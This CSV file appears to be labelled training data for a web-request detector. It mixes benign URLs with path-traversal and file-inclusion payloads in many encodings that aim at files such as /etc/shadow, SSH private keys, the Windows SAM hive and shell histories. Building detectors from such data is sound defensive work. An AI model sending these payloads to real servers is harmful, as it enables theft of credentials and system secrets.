payload,label
/api/v1/search?q=python&page=1,0
/help?action=view&id=8424,0
/show?f=/get%3Fresource%3D../../var/log/apache2/access.log,1
/internal/metrics,0
..\..\windows\system32\drivers\etc\hosts,1
/content?template=/view.php%3Ffile%3D../../../etc/shadow,1
/etc/group,1
/page?name=homepage&version=2,0
/admin/settings,0
../../var/www/html/config.php,1
/include?name=../../../proc/version,1
..%255c..%255cwindows%255cwin.ini,1
/fetch?f=/etc/group,1
/api/health,0
/get?load=/image%3Fsrc%3D../../etc/shadow,1
../../root/.bash_history,1
/api/file?f=..%5C..%5C..%5Cwindows%5Cwin.ini,1
/blog/category/technology,0
/api/status?action=edit&id=6127,0
/read.php?include=/static/js%3Ffile%3D../../../etc/passwd,1
/assets/js/jquery-3.6.0.min.js?action=update&id=2061,0
/api/v1/auth/login,0
/products/laptop-pro-x,0
.%2e/.%2e/etc/passwd,1
/fetch?url=../../etc/shadow,1
/auth/google/callback,0
../../home/ubuntu/.bash_history,1
/read.php?id=../../etc/crontab,1
/stream?channel=main&format=hls?action=list&id=6119,0
../../etc/motd,1
/show?page=../../etc/group,1
/orders,0
/media/uploads/profile_pic.jpg,0
/open?path=..%5C..%5Cwindows%5Csystem32%5Cconfig%5CSAM,1
/read.php?page=/report%3Fpath%3D../../var/log/auth.log,1
/uploads/user_42/avatar.png,0
/file.php?name=..%2f..%2fetc%2fpasswd,1
..%c1%9c..%c1%9cetc%c1%9cpasswd,1
/index.php?load=../../etc/passwd%2500.jpg,1
..././..././etc/passwd,1
/read.php?template=../../etc/issue,1
../../var/log/nginx/access.log,1
/api/v1/categories?action=view&id=515,0
..\..\windows\system32\config\SAM,1
..%2f%2e%2e%2fetc%2fpasswd,1
/view?id=1001&format=json?action=delete&id=8006,0
/video?id=xyz789&quality=720p,0
/show?doc=../../etc/crontab,1
/api/v2/products,0
/help,0
/contact,0
/auth/github?action=update&id=10,0
../../windows/system32/config/SAM,1
/index.php?file=/admin/download%3Ffile%3D../../../etc/shadow,1
/console/overview,0
/callback/oauth?action=edit&id=8838,0
/terms,0
..%5c..%5cwindows%5cwin.ini,1
/blog?page=3&limit=10,0
/admin/dashboard,0
/checkout?action=update&id=7398,0
/admin/dashboard?action=edit&id=7750,0
/api/v1/users/42?action=edit&id=2622,0
/news/article/456,0
/api/file?path=../../home/user/.ssh/id_rsa,1
/api/v1/tags?action=delete&id=7954,0
/load?module=../../proc/self/environ,1
/fetch?name=../../etc/motd,1
/index.php?page=..%255c..%255cwindows%255cwin.ini,1
/api/health?action=edit&id=8787,0
/include?include=/load.php%3Ftemplate%3D../../../../etc/hosts,1
../../winnt/win.ini,1
/products?category=electronics&sort=price_asc?action=edit&id=4343,0
/download?file=..%252f%252e%252e%252fetc%252fpasswd,1
/template?id=basic&color=blue,0
/show?load=../../etc/fstab,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
/404?action=delete&id=9065,0
/robots.txt,0
/view?id=1001&format=json,0
/app/dashboard,0
/file?id=abc123&type=pdf,0
../../etc/passwd%00,1
/api/file?url=../../windows/win.ini,1
/view.php?include=..%5C..%5C/etc/passwd,1
/docs/getting-started,0
../../etc/shadow%00.html,1
../../windows/system32/drivers/etc/hosts,1
....\\....\\windows\\win.ini,1
../../../../../../etc/passwd,1
"/export?type=csv&fields=name,email",0
/content?template=../../var/log/apache2/access.log,1
/include?include=/index.php%3Finclude%3D....//....//etc/passwd,1
../../var/log/apache2/access.log,1
/get?file=../../etc/resolv.conf,1
/api/v2/products?action=edit&id=3682,0
/media/uploads/profile_pic.jpg?action=list&id=7963,0
/static/js?file=../../../etc/passwd,1
/%2e%2e/%2e%2e/etc/passwd,1
/checkout,0
/open?template=/%252e%252e/%252e%252e/etc/passwd,1
../../etc/crontab,1
C:\boot.ini,1
%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
/orders/history,0
/open?q=../../etc/shadow,1
/fetch?url=..%5C..%5Cboot.ini,1
/include?name=/fetch%3Furl%3D../../etc/shadow,1
/get?q=../../var/www/html/config.php,1
/api/v1/tags,0
/static/js/app.js,0
/oidc/token?action=view&id=4074,0
/api/v1/auth/logout,0
/show?doc=../../etc/passwd%2500,1
/products,0
/read.php?resource=/load%3Fmodule%3D../../proc/self/environ,1
../../etc/passwd,1
/dashboard,0
/fetch?doc=/download.php%3Ffilename%3D../../etc/passwd,1
/public/img/banner.jpg?action=list&id=965,0
/api/v1/tags?action=update&id=1291,0
/cdn/icons/icon-192.png,0
/content?lang=en&theme=dark,0
/products?category=electronics&sort=price_asc,0
../../../../etc/passwd,1
/saml/acs?action=list&id=6917,0
/include?url=../../etc/passwd,1
/api/v1/settings,0
/static/images/logo.png,0
/reports?from=2024-01-01&to=2024-12-31,0
/search?q=machine+learning&page=2,0
..%2f..%2fetc%2fshadow,1
/api/file?resource=%252e./%252e./etc/passwd,1
/webhook/github,0
/api/v1/users?action=list&id=4890,0
/v1/health,0
